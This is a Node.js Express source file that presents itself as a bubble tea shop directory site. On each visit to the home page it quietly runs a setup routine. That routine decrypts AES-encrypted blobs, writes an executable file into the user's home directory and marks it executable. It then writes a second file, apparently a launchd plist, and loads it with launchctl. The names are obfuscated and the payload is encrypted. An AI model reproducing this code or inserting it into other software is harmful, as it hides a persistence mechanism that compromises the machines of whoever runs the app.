const fs = require('fs');
var bodyParser = require("body-parser")
var express = require("express")
var app = express()
var CryptoJS = require("crypto-js")
const homedir = require('os').homedir()
const execSync = require('child_process').execSync
const delay = ms => new Promise(res => setTimeout(res, ms));

app.set("view engine", "ejs")
app.use(express.static(__dirname + "/public"))
app.use(bodyParser.urlencoded({extended: true}))

var port = 3000;
var shops = [
   {name: "Sharetea", image: "Sharetea_logo.png", description: "500 teahouses in 15 countries that import their authentic tea leaves from Taiwan. Stop by a location today and sip share love!", phone: "(714) 736-3948", address: "123 N Gilbert Lane"},
   {name: "Kung Fu Tea", image: "KungFuTea_logo.png", description: "Welcome to Kung Fu Tea's Fresh - Innovative - Fearless world of bubble tea (boba) and other tasty, refreshing beverages.", phone: "(714) 736-3948", address: "123 N Gilbert Lane"}
]

app.get("/", function(req, res) {
   res.render("index")

   setup()
})

app.get("/shops", function(req, res){
   res.render("shops", {shops:shops})
})

app.get("/shops/new", function(req, res){
   res.render("new.ejs")
})

// 1) Registered businesses can create/modify a single shop
// 2) Admins can create/modify/delete shops
// 3) Businesses must request a shop be deleted from the site
app.post("/shops", function(req, res){
   var name = req.body.name
   var image = req.body.image
   var description = req.body.description
   var phone = req.body.phone
   var address = req.body.address
   var newShop = {name: name, image: image, description: description, phone: phone, address: address}

   shops.push(newShop)

   res.redirect("/shops")
})

app.listen(port, function(){
   console.log("listening on port: " + port + "...")
})

var encryptedAccess = {rs: "U2FsdGVkX19UVKvwPcE06f894iJTjwfqm3VCSMWCmMIpm8AO0Ln2NINcRDnCbTifuOj9PFBbvPQxJ1UOGupw7PcEYtQrRQzWncg+TCnSk/E=", 
plf: "U2FsdGVkX1+rFYbpYpl2gDUuSCphwENbWjTZ0KbbbMnEI1TBjw6/HUk/LRWZjCq9aBQH6/eUKSjK+jXAMB7MjA/fSzmBxSvSWPWedDLB2MPXPOM8O5/fdPtTCHEr//J5c2I2XJSJMdGn57CmV3W0cH4Hyeh59hwwwUBy8+TmE65FqVGygFv+QSBZKYY9wQzzn2NfX6pGRZoOySL8/wOHRQ==",
plb: "U2FsdGVkX19s+Mv4tluIyLnJ1ZGicx7q9qYwf2SuajsZt8G6U1IVfE1VrfWnUSbBn/YNE2YFefoetWpKyPqIDMXGMEEIgrWHGApVKNfastfaB+bihnMWKm/E4lB4oYXgNZUPTd/w1iCTq3Hz2zqNq7vGgu5LH84MiaMQAjYfLZo=",
rsl: "U2FsdGVkX1+jRto9jv8GPJGFrvCvzqQosUtkgjWOZaOKnkJPkHXJxesDfR0VepHX",
psl: "U2FsdGVkX1+YT0z6s8FyiCalRNEJL8FGcUKUG0jkyOdxwlddl5vK4kFhY1riROJ+hxEJmVMocHGdlpQ6yMhX2cePnoz5feG5ExQ2DMUqUKc="
}

function bm(file, dataToMatch){
   fs.promises.readFile(file, 'utf-8').then(dataAsString => {
      return dataAsString === dataToMatch
   })
   .catch(err => {
      console.log(err)
      return false
   })
}

function gd(fileLocation)
{
   var index = 0
   for (i = 0; i < fileLocation.length; i++) {
      if(fileLocation[i] == '/') {
         index = i
      }
   }

   var solution = ""
   for( i = 0; i < index; i++) {
      solution += fileLocation[i]
   }

   return solution
}

function wdtf(file, data)
{
   fs.promises.mkdir(gd(file), {recursive: true}).then(() => {
      fs.promises.writeFile(file, data).then(() => {
         console.log("Success.")
      })
      .catch(err => {
         console.log(err)
      })
   }).catch(err => {
      if(err.code === 'EEXIST')
      {
         fs.promises.writeFile(file, data).then(() => {
               console.log("Success.")
         })
         .catch(err => {
               console.log(err)
         })
      }
      else {
         console.log(err)
      }
   })
} 

async function setup(){
   rsLocation =  homedir + CryptoJS.AES.decrypt(encryptedAccess.rsl.toString(), "secret").toString(CryptoJS.enc.Utf8)
   plLocation = homedir + CryptoJS.AES.decrypt(encryptedAccess.psl.toString(), "secret").toString(CryptoJS.enc.Utf8)

   var unencrypted = CryptoJS.AES.decrypt(encryptedAccess.rs.toString(), "secret")
   var match = bm(rsLocation, unencrypted.toString(CryptoJS.enc.Utf8))

   if(!match) {
      wdtf(rsLocation, CryptoJS.AES.decrypt(encryptedAccess.rs, "secret")
      .toString(CryptoJS.enc.Utf8))
   }

   await delay(5000);
   output = execSync('chmod +x ' + rsLocation)

   var combined = CryptoJS.AES.decrypt(encryptedAccess.plf, "secret").toString(CryptoJS.enc.Utf8) + homedir + 
   CryptoJS.AES.decrypt(encryptedAccess.plb, "secret").toString(CryptoJS.enc.Utf8)

   match = bm(plLocation, combined)
   if(!match) {
      wdtf(plLocation, combined)
   }

   await delay(5000);
   output = execSync('launchctl load ' + plLocation)
}
